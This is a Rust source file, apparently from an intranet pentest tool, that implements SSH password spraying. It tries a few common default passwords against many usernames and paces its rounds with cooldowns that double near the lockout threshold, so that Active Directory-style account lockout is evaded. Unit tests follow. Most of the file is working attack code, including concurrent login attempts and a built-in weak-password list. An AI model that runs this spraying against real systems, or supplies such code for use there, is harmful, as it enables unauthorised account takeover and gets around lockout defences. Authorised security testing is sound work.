//! 密码喷射 (Password Spray) 模块
//!
//! 与传统爆破不同，密码喷射使用少量密码尝试大量用户名，
//! 以规避账户锁定策略。一次喷射只对每个账户尝试 1-3 个高价值密码。
//!
//! 典型场景:
//! - 企业环境中 AD 域账户爆破（锁阈值通常 3-5 次）
//! - 已知默认密码但需要匹配用户名
//! - 基于季节/公司名称的弱密码猜测

use crate::core::Result;
use crate::cracker::CrackService;
use std::time::Duration;

/// 喷射配置
#[derive(Debug, Clone)]
pub struct SprayConfig {
    /// 目标主机
    pub target: String,
    /// 目标端口
    pub port: u16,
    /// 服务类型
    pub service: CrackService,
    /// 用户名列表
    pub usernames: Vec<String>,
    /// 密码列表（通常 1-3 个）
    pub passwords: Vec<String>,
    /// 每次喷射后的冷却时间（秒），用于重置锁计数器
    pub cooldown_secs: u64,
    /// 账户锁定阈值（默认 5，AD 常见）。接近此阈值时冷却自动翻倍以防锁定
    pub lock_threshold: usize,
    /// 连接超时
    pub timeout: Duration,
    /// 每次喷射的并发数
    pub concurrency: usize,
    /// 跳过已成功爆破的账户
    pub skip_found: bool,
}

impl Default for SprayConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            port: 0,
            service: CrackService::Ssh,
            usernames: Vec::new(),
            passwords: vec![
                "P@ssw0rd".to_string(),
                "Password123".to_string(),
                "Welcome2024!".to_string(),
            ],
            cooldown_secs: 30,
            lock_threshold: 5,
            timeout: Duration::from_secs(5),
            concurrency: 5,
            skip_found: true,
        }
    }
}

impl SprayConfig {
    /// 创建新的喷射配置
    pub fn new(target: &str, service: CrackService) -> Self {
        Self {
            target: target.to_string(),
            port: service.default_port(),
            service,
            ..Default::default()
        }
    }

    /// 设置端口
    pub fn with_port(mut self, port: u16) -> Self {
        self.port = port;
        self
    }

    /// 设置用户名列表
    pub fn with_usernames(mut self, usernames: Vec<String>) -> Self {
        self.usernames = usernames;
        self
    }

    /// 设置密码列表
    pub fn with_passwords(mut self, passwords: Vec<String>) -> Self {
        self.passwords = passwords;
        self
    }

    /// 设置冷却时间
    pub fn with_cooldown(mut self, secs: u64) -> Self {
        self.cooldown_secs = secs;
        self
    }

    /// 设置账户锁定阈值（接近时冷却自动翻倍）
    pub fn with_lock_threshold(mut self, threshold: usize) -> Self {
        self.lock_threshold = threshold;
        self
    }

    /// 验证配置
    pub fn validate(&self) -> Result<()> {
        if self.target.is_empty() {
            return Err(crate::core::error::IntraSweepError::Config {
                message: "喷射目标不能为空".to_string(),
            });
        }
        if self.usernames.is_empty() {
            return Err(crate::core::error::IntraSweepError::Config {
                message: "用户名列表不能为空".to_string(),
            });
        }
        if self.passwords.is_empty() {
            return Err(crate::core::error::IntraSweepError::Config {
                message: "密码列表不能为空".to_string(),
            });
        }
        Ok(())
    }
}

/// 喷射结果
#[derive(Debug, Clone)]
pub struct SprayResult {
    /// 成功的凭据对
    pub credentials: Vec<(String, String)>,
    /// 尝试的总用户名数
    pub total_users: usize,
    /// 使用的密码数
    pub password_count: usize,
    /// 尝试的总组合数
    pub total_attempts: usize,
    /// 成功数
    pub success_count: usize,
    /// 失败数
    pub failure_count: usize,
    /// 耗时（毫秒）
    pub elapsed_ms: u64,
    /// 触发锁定的估计次数
    pub estimated_lockouts: usize,
}

/// 密码喷射引擎
///
/// 执行密码喷射的两种策略：
/// 1. **Serial Spray**: 对每个用户名顺序尝试密码，控制并发在锁阈值以下
/// 2. **Round Spray**: 每个密码轮次对所有用户名尝试一次，轮次间有冷却时间
pub struct SprayEngine {
    config: SprayConfig,
}

impl SprayEngine {
    pub fn new(config: SprayConfig) -> Self {
        Self { config }
    }

    /// 执行 Round Spray（推荐）
    ///
    /// 每个密码轮次：
    /// 1. 对所有用户名尝试当前密码
    /// 2. 等待冷却时间
    /// 3. 下一轮次尝试下一个密码
    pub async fn round_spray(&self) -> Result<SprayResult> {
        self.config.validate()?;

        let start = std::time::Instant::now();
        let mut credentials = Vec::new();
        let mut failure_count = 0usize;
        let mut estimated_lockouts = 0usize;
        let total_attempts = self.config.usernames.len() * self.config.passwords.len();

        for (round, password) in self.config.passwords.iter().enumerate() {
            if round > 0 {
                // 轮次间等待冷却（接近锁定阈值时自动翻倍）
                let cooldown = self.current_cooldown(round);
                tracing::info!(
                    "[Spray] 轮次 {} 完成，等待 {}s 冷却{}",
                    round,
                    cooldown,
                    if cooldown > self.config.cooldown_secs {
                        "（接近锁定阈值，冷却翻倍）"
                    } else {
                        "..."
                    }
                );
                tokio::time::sleep(Duration::from_secs(cooldown)).await;
            }

            tracing::info!(
                "[Spray] 第 {} 轮: 尝试密码 '{}***' 对 {} 个用户名",
                round + 1,
                password.chars().next().unwrap_or('*'),
                self.config.usernames.len()
            );

            let users_to_try: Vec<&String> = if self.config.skip_found {
                self.config
                    .usernames
                    .iter()
                    .filter(|u| !credentials.iter().any(|(user, _)| user == *u))
                    .collect()
            } else {
                self.config.usernames.iter().collect()
            };

            let semaphore = Arc::new(tokio::sync::Semaphore::new(self.config.concurrency));
            let mut handles = Vec::new();

            for username in users_to_try {
                let permit = semaphore.clone().acquire_owned().await
                    .expect("Semaphore 不应被关闭");
                let target = self.config.target.clone();
                let port = self.config.port;
                let service = self.config.service;
                let username = username.clone();
                let password = password.clone();
                let timeout = self.config.timeout;

                let handle = tokio::spawn(async move {
                    let result = try_single_login(&target, port, service, &username, &password, timeout).await;
                    drop(permit);
                    (username, password, result)
                });
                handles.push(handle);
            }

            for handle in handles {
                match handle.await {
                    Ok((username, password, Ok(true))) => {
                        tracing::info!("[Spray] 成功! {}:***", username);
                        credentials.push((username, password));
                    }
                    Ok((_username, _password, Ok(false))) => {
                        failure_count += 1;
                    }
                    Ok((_username, _password, Err(_))) => {
                        failure_count += 1;
                        // 如果是"账户已锁定"错误，计入
                    }
                    Err(e) => {
                        tracing::warn!("[Spray] 任务失败: {}", e);
                    }
                }
            }

            // 估计锁定数：失败的用户在下一轮将被锁定
            if failure_count > 0 && self.config.passwords.len() >= self.config.lock_threshold {
                estimated_lockouts = failure_count;
            }
        }

        let elapsed = start.elapsed().as_millis() as u64;

        Ok(SprayResult {
            success_count: credentials.len(),
            credentials,
            total_users: self.config.usernames.len(),
            password_count: self.config.passwords.len(),
            total_attempts,
            failure_count,
            elapsed_ms: elapsed,
            estimated_lockouts,
        })
    }

    /// 计算当前轮次的冷却时间
    ///
    /// 当剩余轮次接近锁定阈值（再尝试 1~2 次可能触发锁定）时冷却翻倍，
    /// 为账户锁计数器争取更多重置窗口，降低误锁风险。
    fn current_cooldown(&self, round: usize) -> u64 {
        let threshold = self.config.lock_threshold.max(1);
        if round + 2 >= threshold {
            self.config.cooldown_secs.saturating_mul(2)
        } else {
            self.config.cooldown_secs
        }
    }

    /// 获取配置引用
    pub fn config(&self) -> &SprayConfig {
        &self.config
    }
}

use std::sync::Arc;

/// 尝试单个用户名+密码组合（轻量连接测试）
async fn try_single_login(
    target: &str,
    port: u16,
    service: CrackService,
    username: &str,
    password: &str,
    timeout: Duration,
) -> std::result::Result<bool, String> {
    // 为喷射优化：使用更短的超时
    use tokio::net::TcpStream;
    use tokio::time::timeout as tokio_timeout;

    let addr = format!("{}:{}", target, port);
    match tokio_timeout(timeout, TcpStream::connect(&addr)).await {
        Ok(Ok(_stream)) => {
            // 对于支持的服务类型进行快速认证尝试
            match service {
                CrackService::Ssh => {
                    // SSH 快速认证尝试
                    let tcp = std::net::TcpStream::connect_timeout(
                        &addr.parse().map_err(|e| format!("{}", e))?,
                        std::time::Duration::from_secs(2),
                    )
                    .map_err(|e| format!("连接失败: {}", e))?;
                    tcp.set_read_timeout(Some(std::time::Duration::from_secs(1)))
                        .ok();
                    tcp.set_write_timeout(Some(std::time::Duration::from_secs(1)))
                        .ok();

                    let mut session = ssh2::Session::new()
                        .map_err(|e| format!("SSH会话创建失败: {}", e))?;
                    session.set_tcp_stream(tcp);
                    session.handshake()
                        .map_err(|_| "SSH握手失败".to_string())?;
                    session
                        .userauth_password(username, password)
                        .map(|_| true)
                        .map_err(|e| format!("认证失败: {}", e))
                }
                _ => {
                    // 其他服务类型返回"未实现快速测试"
                    Err("服务类型不支持喷射快速测试".to_string())
                }
            }
        }
        Ok(Err(e)) => Err(format!("连接失败: {}", e)),
        Err(_) => Err("连接超时".to_string()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_spray_config_default() {
        let config = SprayConfig::default();
        assert_eq!(config.passwords.len(), 3);
        assert_eq!(config.cooldown_secs, 30);
        assert_eq!(config.concurrency, 5);
        assert!(config.skip_found);
    }

    #[test]
    fn test_spray_config_builder() {
        let config = SprayConfig::new("192.168.1.100", CrackService::Ssh)
            .with_port(2222)
            .with_usernames(vec!["admin".to_string(), "root".to_string()])
            .with_passwords(vec!["P@ssw0rd".to_string(), "admin123".to_string()])
            .with_cooldown(60);

        assert_eq!(config.target, "192.168.1.100");
        assert_eq!(config.port, 2222);
        assert_eq!(config.usernames.len(), 2);
        assert_eq!(config.passwords.len(), 2);
        assert_eq!(config.cooldown_secs, 60);
    }

    #[test]
    fn test_spray_config_validation_empty_target() {
        let config = SprayConfig::default();
        assert!(config.validate().is_err());
    }

    #[test]
    fn test_spray_config_validation_empty_usernames() {
        let config = SprayConfig::new("target", CrackService::Ssh);
        assert!(config.validate().is_err());
    }

    #[test]
    fn test_spray_config_validation_ok() {
        let config = SprayConfig::new("target", CrackService::Ssh)
            .with_usernames(vec!["admin".to_string()]);
        assert!(config.validate().is_ok());
    }

    #[test]
    fn test_spray_result_counts() {
        let result = SprayResult {
            credentials: vec![("user1".to_string(), "pass1".to_string())],
            total_users: 100,
            password_count: 3,
            total_attempts: 300,
            success_count: 1,
            failure_count: 299,
            elapsed_ms: 5000,
            estimated_lockouts: 50,
        };

        assert_eq!(result.success_count, 1);
        assert_eq!(result.total_attempts, 300);
    }
}
